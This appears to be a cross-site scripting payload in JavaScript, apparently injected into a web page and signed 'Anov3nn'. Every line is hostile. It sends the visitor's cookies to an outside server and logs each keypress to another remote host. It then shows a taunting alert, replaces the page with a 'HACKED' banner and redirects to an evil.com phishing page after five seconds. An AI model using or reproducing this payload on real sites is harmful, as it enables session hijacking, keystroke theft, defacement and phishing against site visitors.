fetch('https://yourserver.com/log?cookie=' + document.cookie);
document.onkeypress = function(e) {
    fetch('https://gtszayijeuhquctbmohmzogwtpzcsuspe.oast.fun/keylog?key=' + encodeURIComponent(e.key));
};
alert("🔥 XSS Pwned by Anov3nn! Your data belongs to me! 💀");
document.body.innerHTML = "<h1 style='color:red; text-align:center;'>🔥 HACKED! 🔥</h1>";
setTimeout(function() {
    window.location = "https://evil.com/phishing";
}, 5000);
